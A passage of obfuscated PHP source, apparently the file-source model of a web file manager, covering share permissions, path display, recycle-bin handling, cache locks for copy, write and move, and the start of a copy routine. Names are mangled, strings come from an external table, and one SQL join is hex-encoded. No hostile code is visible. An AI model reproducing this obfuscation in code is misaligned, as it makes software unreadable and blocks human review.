} unset($ºƒÀ¿° ); } public function _listAppendAuthSecret(&$±Ğ¹äîä) { $×ú‰¨õ· =& $_SERVER[¤·²È‰º]; if (Model($×ú‰¨õ·[443])->get($×ú‰¨õ·[514]) != $×ú‰¨õ·[98]) { return; } static $µƒø“À  = false; if (!$µƒø“À ) { $ëÂ½ëç = Model($×ú‰¨õ·[515]); $²ÕÓë§ = Model($×ú‰¨õ·[516]); $µƒø“À  = $²ÕÓë§->listData(); $µƒø“À  = array_to_keyvalue($µƒø“À , $×ú‰¨õ·[410]); $àˆÊÍÂ = json_decode(Model($×ú‰¨õ·[443])->get($×ú‰¨õ·[517]), !0); $àˆÊÍÂ = array_to_keyvalue($àˆÊÍÂ, $×ú‰¨õ·[407]); foreach ($µƒø“À  as $ˆ¢Ö¡¡§ => $ßÒæ ¸) { $ÍÜÓêËü = $àˆÊÍÂ[$ßÒæ ¸[$×ú‰¨õ·[518]]]; if (!$ÍÜÓêËü) { $²ÕÓë§->remove($ßÒæ ¸[$×ú‰¨õ·[407]]); unset($µƒø“À [$ˆ¢Ö¡¡§]); continue; } $–Ï®ŞÅø = $ëÂ½ëç->listData($ÍÜÓêËü[$×ú‰¨õ·[421]]); if (!$–Ï®ŞÅø) { $²ÕÓë§->remove($ßÒæ ¸[$×ú‰¨õ·[407]]); unset($µƒø“À [$ˆ¢Ö¡¡§]); continue; } $ßÒæ ¸[$×ú‰¨õ·[421]] = $–Ï®ŞÅø; $ßÒæ ¸[$×ú‰¨õ·[519]] = $ÍÜÓêËü; $ßÒæ ¸[$×ú‰¨õ·[520]] = Model($×ú‰¨õ·[521])->getInfoSimpleOuter($ßÒæ ¸[$×ú‰¨õ·[462]]); $µƒø“À [$ˆ¢Ö¡¡§] = $ßÒæ ¸; } } $…ÎÍÑ¨« = defined($×ú‰¨õ·[522]) ? USER_ID : $×ú‰¨õ·[12]; $ã…ó¡ó² = array(); $Å‰Ïİı¢ = $this->_listAppendPath($ã…ó¡ó², !0); foreach ($±Ğ¹äîä as $ˆ¢Ö¡¡§ => &$ßÒæ ¸) { if (!is_array($ßÒæ ¸[$×ú‰¨õ·[421]])) { continue; } if ($ßÒæ ¸[$×ú‰¨õ·[419]] != $×ú‰¨õ·[523]) { continue; } if (isset($µƒø“À [$ßÒæ ¸[$×ú‰¨õ·[410]]])) { $Úµ¿ù = $µƒø“À [$ßÒæ ¸[$×ú‰¨õ·[410]]]; if (!is_array($ßÒæ ¸[$×ú‰¨õ·[474]])) { $ßÒæ ¸[$×ú‰¨õ·[474]] = array(); } $ßÒæ ¸[$×ú‰¨õ·[474]][$×ú‰¨õ·[524]] = $Úµ¿ù[$×ú‰¨õ·[518]]; $ßÒæ ¸[$×ú‰¨õ·[421]][$×ú‰¨õ·[525]] = $Úµ¿ù; $ßÒæ ¸[$×ú‰¨õ·[421]][$×ú‰¨õ·[526]] = $ßÒæ ¸[$×ú‰¨õ·[527]]; $ßÒæ ¸[$×ú‰¨õ·[421]][$×ú‰¨õ·[528]] = $×ú‰¨õ·[98]; if ($Úµ¿ù[$×ú‰¨õ·[462]] != $…ÎÍÑ¨«) { $ßÒæ ¸[$×ú‰¨õ·[421]][$×ú‰¨õ·[422]] = $ßÒæ ¸[$×ú‰¨õ·[421]][$×ú‰¨õ·[422]] & $Úµ¿ù[$×ú‰¨õ·[421]][$×ú‰¨õ·[421]]; } continue; } $›®—ÍÑù = $this->parentLevelArray($ßÒæ ¸[$×ú‰¨õ·[529]]); $×¹¤Ùê³ = array_reverse($›®—ÍÑù); foreach ($×¹¤Ùê³ as $êÈŠ›… => $àù±Î¸ƒ) { if (!isset($µƒø“À [$àù±Î¸ƒ])) { continue; } $Úµ¿ù = $µƒø“À [$àù±Î¸ƒ]; $ßÒæ ¸[$×ú‰¨õ·[421]][$×ú‰¨õ·[525]] = $Úµ¿ù; if ($Úµ¿ù[$×ú‰¨õ·[462]] != $…ÎÍÑ¨«) { $ßÒæ ¸[$×ú‰¨õ·[421]][$×ú‰¨õ·[422]] = $ßÒæ ¸[$×ú‰¨õ·[421]][$×ú‰¨õ·[422]] & $Úµ¿ù[$×ú‰¨õ·[421]][$×ú‰¨õ·[421]]; } $†À²ßı™ = $×ú‰¨õ·[12]; $æ¤¯Œñİ = count($›®—ÍÑù) - $êÈŠ›…; for ($üÍº‡Ú = 0; $üÍº‡Ú < $æ¤¯Œñİ; $üÍº‡Ú++) { if (!isset($Å‰Ïİı¢[$›®—ÍÑù[$üÍº‡Ú]])) { $†À²ßı™ = $×ú‰¨õ·[12]; break; } $†À²ßı™ = $†À²ßı™ . rtrim($Å‰Ïİı¢[$›®—ÍÑù[$üÍº‡Ú]], $×ú‰¨õ·[8]) . $×ú‰¨õ·[8]; } $ßÒæ ¸[$×ú‰¨õ·[421]][$×ú‰¨õ·[526]] = rtrim($†À²ßı™, $×ú‰¨õ·[8]) . $×ú‰¨õ·[8]; break; } } unset($ßÒæ ¸); } public function groupPathDisplay(&$—®İ²¡´) { $»Ö‘âÆó =& $_SERVER[¤·²È‰º]; if ($—®İ²¡´[$»Ö‘âÆó[419]] != self::TYPE_GROUP) { return; } $Âú ˆŞ¡ = Model($»Ö‘âÆó[530])->getInfo($—®İ²¡´[$»Ö‘âÆó[513]]); $õò³Óü² = $this->parentLevelArray($Âú ˆŞ¡[$»Ö‘âÆó[529]]); $Õ²î¤‹Á = $»Ö‘âÆó[12]; foreach ($õò³Óü² as $¹¥ºËæ) { $…›±ç¢Ã = Model($»Ö‘âÆó[530])->getInfo($¹¥ºËæ); $Õ²î¤‹Á .= $…›±ç¢Ã[$»Ö‘âÆó[96]][$»Ö‘âÆó[410]] . $»Ö‘âÆó[60]; } $—®İ²¡´[$»Ö‘âÆó[531]] = $Âú ˆŞ¡[$»Ö‘âÆó[440]]; $—®İ²¡´[$»Ö‘âÆó[532]] = $Âú ˆŞ¡[$»Ö‘âÆó[529]]; $—®İ²¡´[$»Ö‘âÆó[533]] = $Âú ˆŞ¡[$»Ö‘âÆó[534]]; $—®İ²¡´[$»Ö‘âÆó[535]] = $Õ²î¤‹Á . $Âú ˆŞ¡[$»Ö‘âÆó[96]][$»Ö‘âÆó[410]]; } protected function _listAppendPath(&$ÛÑóîÖÉ, $ÎÏ©£¦ê = false) { $ç“Û±Áä =& $_SERVER[¤·²È‰º]; static $™ìá»’ = array(); $ß­«¼óé = array(); $œåŒ« = array(); if ($ÎÏ©£¦ê) { return $™ìá»’; } foreach ($ÛÑóîÖÉ as &$Şë£‹Ş) { $Ï¼»µ¾ü = $Şë£‹Ş[$ç“Û±Áä[410]]; if ($Şë£‹Ş[$ç“Û±Áä[418]] == $ç“Û±Áä[98] && $Şë£‹Ş[$ç“Û±Áä[440]] != 0) { $™ìá»’[$Ï¼»µ¾ü] = $Şë£‹Ş[$ç“Û±Áä[42]]; } if ($Şë£‹Ş[$ç“Û±Áä[418]] == $ç“Û±Áä[98] && $Şë£‹Ş[$ç“Û±Áä[440]] == 0 && !isset($™ìá»’[$Ï¼»µ¾ü])) { $™ìá»’[$Ï¼»µ¾ü] = $this->_listAppendPathRoot($Şë£‹Ş, array()); } if (isset($œåŒ«[$Şë£‹Ş[$ç“Û±Áä[529]]])) { continue; } $œåŒ«[$Şë£‹Ş[$ç“Û±Áä[529]]] = !0; $­¥İÜÛŸ = $this->parentLevelArray($Şë£‹Ş[$ç“Û±Áä[529]]); foreach ($­¥İÜÛŸ as $ˆåíñà => $Šùô ¤) { if (isset($™ìá»’[$Šùô ¤])) { continue; } if ($ˆåíñà == 0) { $™ìá»’[$Šùô ¤] = $this->_listAppendPathRoot($Şë£‹Ş, $­¥İÜÛŸ); } if ($ˆåíñà != 0) { $ß­«¼óé[] = $Šùô ¤; } } } unset($Şë£‹Ş); $ß­«¼óé = array_unique($ß­«¼óé); if (count($ß­«¼óé) > 0) { $úµÄøÄÊ = array($ç“Û±Áä[425] => array($ç“Û±Áä[426], $ß­«¼óé)); if (count($ß­«¼óé) == 1) { $›¿¼ĞÀ• = $this->sourceInfo($ß­«¼óé[0]); $ÂæÙË´ = is_array($›¿¼ĞÀ•) ? array($›¿¼ĞÀ•) : !1; } else { $ÂæÙË´ = $this->field($ç“Û±Áä[536])->where($úµÄøÄÊ)->select(); } if (!$ÂæÙË´) { $ÂæÙË´ = array(); } foreach ($ÂæÙË´ as $—±šó’±) { $™ìá»’[$—±šó’±[$ç“Û±Áä[410]]] = $—±šó’±[$ç“Û±Áä[42]]; } } $ÈåÃ•ÖÙ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $·ı¶ğ¬´ = array(); foreach ($ÛÑóîÖÉ as &$Şë£‹Ş) { $ªóµÕÅ§ = $Şë£‹Ş[$ç“Û±Áä[529]]; $®¸‰Ÿô® = $ç“Û±Áä[12]; if (isset($·ı¶ğ¬´[$ªóµÕÅ§])) { $®¸‰Ÿô® = $·ı¶ğ¬´[$ªóµÕÅ§]; } else { $­¥İÜÛŸ = $this->parentLevelArray($Şë£‹Ş[$ç“Û±Áä[529]]); foreach ($­¥İÜÛŸ as $ˆåíñà => $Šùô ¤) { if (isset($™ìá»’[$Šùô ¤])) { $®¸‰Ÿô® .= $™ìá»’[$Šùô ¤] . $ç“Û±Áä[8]; } } $·ı¶ğ¬´[$ªóµÕÅ§] = $®¸‰Ÿô®; } $®¸‰Ÿô® .= $Şë£‹Ş[$ç“Û±Áä[42]]; if ($Şë£‹Ş[$ç“Û±Áä[418]] == $ç“Û±Áä[98]) { $®¸‰Ÿô® .= $ç“Û±Áä[8]; } $Şë£‹Ş[$ç“Û±Áä[527]] = str_replace($ç“Û±Áä[537], $ç“Û±Áä[8], $®¸‰Ÿô®); if ($Şë£‹Ş[$ç“Û±Áä[440]] == $ç“Û±Áä[207]) { $Şë£‹Ş[$ç“Û±Áä[42]] = trim($™ìá»’[$Şë£‹Ş[$ç“Û±Áä[410]]], $ç“Û±Áä[8]); $Şë£‹Ş[$ç“Û±Áä[527]] = $Şë£‹Ş[$ç“Û±Áä[42]] . $ç“Û±Áä[8]; } if (intval($Şë£‹Ş[$ç“Û±Áä[419]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($Şë£‹Ş, $­¥İÜÛŸ, $ÈåÃ•ÖÙ); } } unset($Şë£‹Ş); return $ÛÑóîÖÉ; } private function _listAppendPathRecycle(&$¢ä›ù, $Ô›á†ÚĞ, $¿ó×“ı´) { $¢ıüÌË =& $_SERVER[¤·²È‰º]; if (!in_array($¿ó×“ı´, $Ô›á†ÚĞ) && $¢ä›ù[$¢ıüÌË[410]] != $¿ó×“ı´) { return; } $¸±–øÌÜ = explode($¢ıüÌË[8], trim($¢ä›ù[$¢ıüÌË[527]], $¢ıüÌË[8])); $êİÏ†¡é = implode($¢ıüÌË[8], array_slice($¸±–øÌÜ, 2)); $¢ä›ù[$¢ıüÌË[527]] = $¢ıüÌË[8] . LNG($¢ıüÌË[538]) . $¢ıüÌË[8] . ltrim($êİÏ†¡é, $¢ıüÌË[8]); $¢ä›ù[$¢ıüÌË[529]] = $¢ıüÌË[539] . implode($¢ıüÌË[60], array_slice($Ô›á†ÚĞ, 1)) . $¢ıüÌË[60]; if ($¢ä›ù[$¢ıüÌË[410]] == $¿ó×“ı´) { $¢ä›ù[$¢ıüÌË[529]] = $¢ıüÌË[539]; $¢ä›ù[$¢ıüÌË[440]] = $¢ıüÌË[207]; $¢ä›ù[$¢ıüÌË[42]] = LNG($¢ıüÌË[538]); } $¢ä›ù[$¢ıüÌË[540]] = $¢ıüÌË[541]; } protected function _listAppendPathRoot(&$ë÷äÎöû, $àÌ•‡¤ƒ) { $÷ùğ‚®” =& $_SERVER[¤·²È‰º]; static $¸¹É© = false; $Ú¥úŸòš = $÷ùğ‚®”[12]; if ($ë÷äÎöû[$÷ùğ‚®”[419]] == self::TYPE_USER) { if (defined($÷ùğ‚®”[483]) && $ë÷äÎöû[$÷ùğ‚®”[513]] == USER_ID) { $Ú¥úŸòš = LNG($÷ùğ‚®”[542]); if ($¸¹É© === !1) { $‹È—¾Û‘ = Model($÷ùğ‚®”[543])->getInfoFull(USER_ID); $¸¹É© = _get($‹È—¾Û‘, $÷ùğ‚®”[544], $÷ùğ‚®”[12]); } if ($àÌ•‡¤ƒ && $àÌ•‡¤ƒ[0] == $¸¹É© || !$àÌ•‡¤ƒ && $ë÷äÎöû[$÷ùğ‚®”[410]] == $¸¹É©) { $Ú¥úŸòš = LNG($÷ùğ‚®”[545]); $ë÷äÎöû[$÷ùğ‚®”[546]] = $÷ùğ‚®”[547]; } if (!$àÌ•‡¤ƒ) { $ë÷äÎöû[$÷ùğ‚®”[42]] = $Ú¥úŸòš; } } else { $øÃÌ÷šõ = Model($÷ùğ‚®”[521])->getInfoSimple($ë÷äÎöû[$÷ùğ‚®”[513]]); $Ú¥úŸòš = LNG($÷ùğ‚®”[548]) . $÷ùğ‚®”[172] . $øÃÌ÷šõ[$÷ùğ‚®”[42]] . $÷ùğ‚®”[174]; $ë÷äÎöû[$÷ùğ‚®”[549]] = array($÷ùğ‚®”[42] => $øÃÌ÷šõ[$÷ùğ‚®”[42]], $÷ùğ‚®”[550] => $øÃÌ÷šõ[$÷ùğ‚®”[550]], $÷ùğ‚®”[551] => $øÃÌ÷šõ[$÷ùğ‚®”[551]]); } } else { if ($ë÷äÎöû[$÷ùğ‚®”[419]] == self::TYPE_GROUP) { $øÃÌ÷šõ = Model($÷ùğ‚®”[530])->getInfoSimple($ë÷äÎöû[$÷ùğ‚®”[513]]); $Ú¥úŸòš = $øÃÌ÷šõ[$÷ùğ‚®”[42]]; } else { if ($ë÷äÎöû[$÷ùğ‚®”[419]] == self::TYPE_SYSTEM) { $Ú¥úŸòš = $÷ùğ‚®”[552]; } } } $Ú¥úŸòš = $Ú¥úŸòš ? $÷ùğ‚®”[8] . $Ú¥úŸòš . $÷ùğ‚®”[8] : $÷ùğ‚®”[8]; return $Ú¥úŸòš; } protected function _listAppendUser(&$¯×½¯Ğà) { $á¥›©ŒÇ =& $_SERVER[¤·²È‰º]; $×°ÄÂ¨Ô = array_to_keyvalue($¯×½¯Ğà, $á¥›©ŒÇ[12], $á¥›©ŒÇ[462]); $Øáìãö = array_to_keyvalue($¯×½¯Ğà, $á¥›©ŒÇ[12], $á¥›©ŒÇ[464]); $·ÇÃÍ â = array_merge($×°ÄÂ¨Ô, $Øáìãö); $ªŠ“·¬ç = Model($á¥›©ŒÇ[543])->userListInfo($·ÇÃÍ â); foreach ($¯×½¯Ğà as &$šòä¦µ¬) { $ƒ©€«ù‚ = $šòä¦µ¬[$á¥›©ŒÇ[462]]; $šòä¦µ¬[$á¥›©ŒÇ[462]] = $ªŠ“·¬ç[$ƒ©€«ù‚] ? $ªŠ“·¬ç[$ƒ©€«ù‚] : !1; $ƒ©€«ù‚ = $šòä¦µ¬[$á¥›©ŒÇ[464]]; $šòä¦µ¬[$á¥›©ŒÇ[464]] = $ªŠ“·¬ç[$ƒ©€«ù‚] ? $ªŠ“·¬ç[$ƒ©€«ù‚] : !1; if (isset($šòä¦µ¬[$á¥›©ŒÇ[474]]) && $šòä¦µ¬[$á¥›©ŒÇ[474]][$á¥›©ŒÇ[553]]) { $Óûºµğ = $GLOBALS[$á¥›©ŒÇ[6]][$á¥›©ŒÇ[99]][$á¥›©ŒÇ[554]]; if ($šòä¦µ¬[$á¥›©ŒÇ[474]][$á¥›©ŒÇ[555]] <= time() - $Óûºµğ) { $this->metaSet($šòä¦µ¬[$á¥›©ŒÇ[410]], $á¥›©ŒÇ[553], null); $this->metaSet($šòä¦µ¬[$á¥›©ŒÇ[410]], $á¥›©ŒÇ[555], null); unset($šòä¦µ¬[$á¥›©ŒÇ[474]][$á¥›©ŒÇ[553]]); continue; } $ÕıÑ‘ïÈ = $šòä¦µ¬[$á¥›©ŒÇ[474]][$á¥›©ŒÇ[553]]; $šòä¦µ¬[$á¥›©ŒÇ[474]][$á¥›©ŒÇ[556]] = Model($á¥›©ŒÇ[543])->getInfoSimpleOuter($ÕıÑ‘ïÈ); } } unset($šòä¦µ¬); } public function parentLevelArray($Ÿê¬èê‘) { $şáÒ±²ö =& $_SERVER[¤·²È‰º]; $Ÿê¬èê‘ = explode($şáÒ±²ö[60], trim($Ÿê¬èê‘, $şáÒ±²ö[60])); return array_remove_value($Ÿê¬èê‘, $şáÒ±²ö[207]); } public function listAll($Å…íÑ¹ó) { $Ñ¡ åÚã =& $_SERVER[¤·²È‰º]; $ÓÄÏ¨”ê = $this->sourceInfo($Å…íÑ¹ó); $ñÃ›ıôß = array($Ñ¡ åÚã[557] => array($Ñ¡ åÚã[558], $ÓÄÏ¨”ê[$Ñ¡ åÚã[529]] . $Å…íÑ¹ó . $Ñ¡ åÚã[559]), $Ñ¡ åÚã[560] => 0); $î×§§µí = $Ñ¡ åÚã[561]; $ºÈÍåÙ = "\x4c\105\106\124\x20\112\117\111\x4e\40{$this->tablePrefix}\x69\157\x5f\x66\151\154\145\x20\x66\151\x6c\x65\40\157\x6e\40\163\157\x75\x72\x63\145\56\x66\151\x6c\x65\111\104\40\x3d\40\x66\x69\x6c\145\56\146\151\x6c\x65\x49\x44"; $Æ²åÍÚ‡ = $this->alias($Ñ¡ åÚã[454])->field($î×§§µí)->where($ñÃ›ıôß)->join($ºÈÍåÙ)->select(); $this->_listAppendAuth($Æ²åÍÚ‡); $this->_listAppendUser($Æ²åÍÚ‡); $this->_listAppendPath($Æ²åÍÚ‡); $Æ²åÍÚ‡ = array_to_keyvalue($Æ²åÍÚ‡, $Ñ¡ åÚã[410]); $¨¯ñ…éŒ = "\57{$ÓÄÏ¨”ê[$Ñ¡ åÚã[42]]}\x2f"; $¨¯ñ…éŒ = $¨¯ñ…éŒ == $Ñ¡ åÚã[537] ? $Ñ¡ åÚã[8] : $¨¯ñ…éŒ; $Íº¶ŸëŸ = array(); foreach ($Æ²åÍÚ‡ as $ò…éåÚ => $’ê“Û…) { $ù ¥®•Ú = $this->parentLevelArray($’ê“Û…[$Ñ¡ åÚã[529]]); array_shift($ù ¥®•Ú); $ë£ô÷­ = $¨¯ñ…éŒ; for ($ºÁ·€… = 0; $ºÁ·€… < count($ù ¥®•Ú); $ºÁ·€…++) { $ë£ô÷­ .= $Æ²åÍÚ‡[$ù ¥®•Ú[$ºÁ·€…]][$Ñ¡ åÚã[42]] . $Ñ¡ åÚã[8]; } $ë£ô÷­ .= $’ê“Û…[$Ñ¡ åÚã[42]]; if ($’ê“Û…[$Ñ¡ åÚã[418]]) { $ë£ô÷­ .= $Ñ¡ åÚã[8]; } $ë£ô÷­ = str_replace($Ñ¡ åÚã[537], $Ñ¡ åÚã[8], $ë£ô÷­); $ë£ô÷­ = str_replace($Ñ¡ åÚã[537], $Ñ¡ åÚã[8], $ë£ô÷­); $¬ÛóôÌÄ = array($Ñ¡ åÚã[429] => str_replace($Ñ¡ åÚã[537], $Ñ¡ åÚã[8], $ë£ô÷­), $Ñ¡ åÚã[562] => intval($’ê“Û…[$Ñ¡ åÚã[418]]), $Ñ¡ åÚã[96] => $this->pathInfoFilter($’ê“Û…)); if (!$’ê“Û…[$Ñ¡ åÚã[418]]) { $¬ÛóôÌÄ[$Ñ¡ åÚã[476]] = $’ê“Û…[$Ñ¡ åÚã[476]]; $¬ÛóôÌÄ[$Ñ¡ åÚã[97]] = $’ê“Û…[$Ñ¡ åÚã[94]]; } $Íº¶ŸëŸ[] = $¬ÛóôÌÄ; } return $Íº¶ŸëŸ; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($Ÿƒ—¯¬Ö) { $ªÖ¦ƒµ =& $_SERVER[¤·²È‰º]; if (!$this->allowLock()) { return; } $this->_lockCheck($ªÖ¦ƒµ[563], $Ÿƒ—¯¬Ö); $æê½‡Ø = 1; $this->_lockEvent($Ÿƒ—¯¬Ö, array($ªÖ¦ƒµ[564], $ªÖ¦ƒµ[565]), $æê½‡Ø); $this->_lockParent($Ÿƒ—¯¬Ö, array($ªÖ¦ƒµ[565]), $æê½‡Ø); $this->_lockEvent($Ÿƒ—¯¬Ö, array($ªÖ¦ƒµ[566], $ªÖ¦ƒµ[567]), $æê½‡Ø); $this->_lockCheckEnd($ªÖ¦ƒµ[563], $Ÿƒ—¯¬Ö); } public function lockCopyEnd($®†çşÕÌ) { $ÙÚ®ƒÌ =& $_SERVER[¤·²È‰º]; if (!$this->allowLock()) { return; } $„¦•Å = 0; $this->_lockEvent($®†çşÕÌ, array($ÙÚ®ƒÌ[564], $ÙÚ®ƒÌ[565]), $„¦•Å); $this->_lockParent($®†çşÕÌ, array($ÙÚ®ƒÌ[565]), $„¦•Å); $this->_lockEvent($®†çşÕÌ, array($ÙÚ®ƒÌ[566], $ÙÚ®ƒÌ[567]), $„¦•Å); } public function lockWriteStart($Ÿ×ÈÆ¸¥, $‘ÓÙğ  = '') { $âæƒ®ì¢ =& $_SERVER[¤·²È‰º]; if (!$this->allowLock()) { return; } $this->_lockCheck($âæƒ®ì¢[564], $Ÿ×ÈÆ¸¥); $ş·Ğú°’ = 1; $this->_lockKey($âæƒ®ì¢[568] . $Ÿ×ÈÆ¸¥ . $âæƒ®ì¢[10] . $‘ÓÙğ , $ş·Ğú°’); $this->_lockEvent($Ÿ×ÈÆ¸¥, array($âæƒ®ì¢[563], $âæƒ®ì¢[565]), $ş·Ğú°’); $this->_lockParent($Ÿ×ÈÆ¸¥, array($âæƒ®ì¢[563], $âæƒ®ì¢[565]), $ş·Ğú°’); $this->_lockCheckEnd($âæƒ®ì¢[564], $Ÿ×ÈÆ¸¥); } public function lockWriteEnd($€ªşù²á, $”Ãöéêı = '') { $ø½§¾š =& $_SERVER[¤·²È‰º]; if (!$this->allowLock()) { return; } $ÂÖË û´ = 0; $this->_lockKey($ø½§¾š[568] . $€ªşù²á . $ø½§¾š[10] . $”Ãöéêı, $ÂÖË û´); $this->_lockEvent($€ªşù²á, array($ø½§¾š[563], $ø½§¾š[565]), $ÂÖË û´); $this->_lockParent($€ªşù²á, array($ø½§¾š[563], $ø½§¾š[565]), $ÂÖË û´); } public function lockMoveStart($îàÅŠ¿) { $±šç–âŸ =& $_SERVER[¤·²È‰º]; if (!$this->allowLock()) { return; } $this->_lockCheck($±šç–âŸ[565], $îàÅŠ¿); $º–Ä‡×¯ = 1; $this->_lockKey($±šç–âŸ[569] . $îàÅŠ¿, $º–Ä‡×¯); $this->_lockEvent($îàÅŠ¿, array($±šç–âŸ[563], $±šç–âŸ[564]), $º–Ä‡×¯); $this->_lockParent($îàÅŠ¿, array($±šç–âŸ[563], $±šç–âŸ[565]), $º–Ä‡×¯); $this->_lockEvent($îàÅŠ¿, array($±šç–âŸ[570], $±šç–âŸ[566], $±šç–âŸ[567]), $º–Ä‡×¯); $this->_lockCheckEnd($±šç–âŸ[565], $îàÅŠ¿); } public function lockMoveEnd($‰ŒÑ××ñ) { $È¤Åïº =& $_SERVER[¤·²È‰º]; if (!$this->allowLock()) { return; } $ÃÅ²¾ = 0; $this->_lockKey($È¤Åïº[569] . $‰ŒÑ××ñ, $ÃÅ²¾); $this->_lockEvent($‰ŒÑ××ñ, array($È¤Åïº[563], $È¤Åïº[564]), $ÃÅ²¾); $this->_lockParent($‰ŒÑ××ñ, array($È¤Åïº[563], $È¤Åïº[565]), $ÃÅ²¾); $this->_lockEvent($‰ŒÑ××ñ, array($È¤Åïº[570], $È¤Åïº[566], $È¤Åïº[567]), $ÃÅ²¾); } private function _lockCheck($×ªú»ƒá, $­¼†§…õ) { $ŒÓŒê˜Ô =& $_SERVER[¤·²È‰º]; $ê—äÙÎÌ = $this->sourceInfo($­¼†§…õ); $Ø÷”ªñ = $×ªú»ƒá . $ŒÓŒê˜Ô[10] . $­¼†§…õ; $this->_lockTimeStart[$Ø÷”ªñ] = timeFloat(); if (!is_array($ê—äÙÎÌ)) { return; } $î«­á¯· = LNG($ŒÓŒê˜Ô[571]); CacheLock::setErrorMsg($ŒÓŒê˜Ô[172] . htmlspecialchars($ê—äÙÎÌ[$ŒÓŒê˜Ô[42]]) . $ŒÓŒê˜Ô[174] . $î«­á¯·); $this->_lockKey($Ø÷”ªñ, 1); $this->_lockKey($Ø÷”ªñ, 0); $ƒÕáô´ê = array_reverse($this->parentLevelArray($ê—äÙÎÌ[$ŒÓŒê˜Ô[529]])); foreach ($ƒÕáô´ê as $ü§óËÆ…) { $Ø÷”ªñ = $×ªú»ƒá . $ŒÓŒê˜Ô[572] . $ü§óËÆ…; if (CacheLock::lockGet($ŒÓŒê˜Ô[573] . $Ø÷”ªñ)) { $ê—äÙÎÌ = $this->sourceInfo($ü§óËÆ…); CacheLock::setErrorMsg($ŒÓŒê˜Ô[172] . htmlspecialchars($ê—äÙÎÌ[$ŒÓŒê˜Ô[42]]) . $ŒÓŒê˜Ô[174] . $î«­á¯·); $this->_lockKey($Ø÷”ªñ, 1); $this->_lockKey($Ø÷”ªñ, 0); } } } private function _lockCheckEnd($­Üñûé, $”¯‰Ï½) { $ÈŞûùÀû =& $_SERVER[¤·²È‰º]; $á³å’øé = $­Üñûé . $ÈŞûùÀû[10] . $”¯‰Ï½; CacheLock::setErrorMsg($ÈŞûùÀû[22]); if (!isset($this->_lockTimeStart[$á³å’øé])) { return; } $ùŠÚ¬áã = timeFloat() - $this->_lockTimeStart[$á³å’øé]; unset($this->_lockTimeStart[$á³å’øé]); if ($ùŠÚ¬áã > 0.5) { unset(self::$cacheSourceInfo[$ÈŞûùÀû[468] . $”¯‰Ï½]); } $Å¬ØÖğ× = $this->sourceInfo($”¯‰Ï½); if (!$Å¬ØÖğ×) { show_json(LNG($ÈŞûùÀû[115]), !1); } } private function _lockParent($¶Ì½†€î, $¬§Íï‰ş, $–Ø›Ÿ¯Î) { if (!$this->autoLockSet) { return; } $çÓÜ³ô = $this->sourceInfo($¶Ì½†€î); if (!is_array($çÓÜ³ô)) { return; } $Öàáˆ = array_reverse($this->parentLevelArray($çÓÜ³ô[$_SERVER[¤·²È‰º][529]])); foreach ($Öàáˆ as $™ÚëĞìµ) { $this->_lockEvent($™ÚëĞìµ, $¬§Íï‰ş, $–Ø›Ÿ¯Î); } } private function _lockEvent($‰äØï¡, $›Šˆ¥¬ü, $Ä«¹Ã¬Ä) { $şîğâïÅ =& $_SERVER[¤·²È‰º]; if (!$this->autoLockSet) { return; } foreach ($›Šˆ¥¬ü as $İº¤ø’à) { $‚ş©ÚŠì = $İº¤ø’à . $şîğâïÅ[10] . $‰äØï¡; if ($Ä«¹Ã¬Ä && CacheLock::lockGet($şîğâïÅ[573] . $‚ş©ÚŠì)) { continue; } $this->_lockKey($‚ş©ÚŠì, $Ä«¹Ã¬Ä); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($ôÏÓ•â£, $Ë´Åº§ = 1) { $Ş¶İ­şì = $_SERVER[¤·²È‰º][573] . md5($ôÏÓ•â£); if ($Ë´Åº§) { if (isset(self::$_lockItemArr[$Ş¶İ­şì])) { return; } self::$_lockItemArr[$Ş¶İ­şì] = 1; CacheLock::lock($Ş¶İ­şì, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$Ş¶İ­şì])) { return; } unset(self::$_lockItemArr[$Ş¶İ­şì]); CacheLock::unlock($Ş¶İ­şì); } } public function isParentOf($Öˆ¯ÍÓ, $“ñİ†€) { $î˜¹š‹ =& $_SERVER[¤·²È‰º]; $’ŸÆ¶³ = $this->sourceInfo($Öˆ¯ÍÓ); $ñšÕ“ÖŞ = $this->sourceInfo($“ñİ†€); $™€óÌ‰ = $’ŸÆ¶³[$î˜¹š‹[529]] . $’ŸÆ¶³[$î˜¹š‹[410]] . $î˜¹š‹[60]; $åûĞì = $ñšÕ“ÖŞ[$î˜¹š‹[529]] . $ñšÕ“ÖŞ[$î˜¹š‹[410]] . $î˜¹š‹[60]; $–Êíºû¢ = strpos($åûĞì, $™€óÌ‰) === 0; return $–Êíºû¢; } private $targetIsDelete = 0; public function copy($ü¼ø·“, $š‡Ü·, $œğÓÛÌ« = REPEAT_REPLACE, $ÎíÒàåÙ = '') { $ùôáîÀ =& $_SERVER[¤·²È‰º]; $ğ‡¡¬İ¨ = $this->sourceInfo($ü¼ø·“); $µ½Åê†Ô = $this->sourceInfo($š‡Ü·); if (!$ğ‡¡¬İ¨ || !$µ½Åê†Ô || $µ½Åê†Ô[$ùôáîÀ[418]] != $ùôáîÀ[98]) { return !1; } if ($this->isParentOf($ü¼ø·“, $š‡Ü·)) { return !1; } $…á©‰Æà = $ÎíÒàåÙ ? $ÎíÒàåÙ : $ğ‡¡¬İ¨[$ùôáîÀ[42]]; $this->lockCopyStart($ü¼ø·“); $this->lockWriteStart($š‡Ü·, $…á©‰Æà); $®ÇââŸÊ = array($ùôáîÀ[574] => array(), $ùôáîÀ[575] => array(), $ùôáîÀ[576] => array()); $this->targetIsDelete = intval($ğ‡¡¬İ¨[$ùôáîÀ[439]]); $ä·½œæ› = $this->fileNameExistCache($š‡Ü·, $ğ‡¡¬İ¨[$ùôáîÀ[42]]); $áâœ¼µ = $this->_copy($ü¼ø·“, $š‡Ü·, $œğÓÛÌ«, $®ÇââŸÊ, !0, $ÎíÒàåÙ); $this->_childrenListClear(); $this->lockCopyEnd($ü¼ø·“); $this->lockWriteEnd($š‡Ü·, $…á©‰Æà); if ($ğ‡¡¬İ¨[$ùôáîÀ[418]] == $ùôáîÀ[98] && $ä·½œæ› == $áâœ¼µ) { $this->folderSizeResetChildren($ä·½œæ›); } Model($ùôáîÀ[577])->addAll($®ÇââŸÊ[$ùôáîÀ[575]], array(), !0); if ($ä·½œæ› != $áâœ¼µ || 